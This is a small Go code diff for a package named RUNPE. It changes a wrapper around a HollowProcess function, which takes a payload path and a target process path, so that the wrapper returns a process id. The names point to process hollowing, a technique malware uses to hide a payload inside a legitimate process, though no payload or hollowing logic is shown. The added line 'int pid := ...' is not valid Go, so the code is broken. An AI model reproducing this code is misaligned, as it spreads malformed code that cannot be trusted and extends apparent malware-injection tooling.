@@ -1,5 +1,6 @@
 package RUNPE
 
-func RUNPE(payloadPath string, targetPath string, arguments string) {
-	HollowProcess(payloadPath, targetPath, arguments)
+func RUNPE(payloadPath string, targetPath string, arguments string) int {
+	int pid := HollowProcess(payloadPath, targetPath, arguments)
+	return pid
 }
